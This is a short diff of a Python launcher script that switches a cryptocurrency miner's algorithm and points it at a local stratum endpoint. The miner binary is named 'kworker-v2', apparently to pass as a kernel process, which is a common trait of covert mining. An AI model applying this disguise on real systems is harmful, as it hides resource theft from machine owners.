@@ -52,7 +52,7 @@ def main():
     print(f"[*] Launching C-miner on {threads} threads...")
     miner_cmd = [
         "./kworker-v2", 
-        "-a", "xelisv2", 
+        "-a", "hoohash-pepew", 
         "-o", f"stratum+tcp://127.0.0.1:{local_port}", 
         "-u", username, 
         "-p", password, 
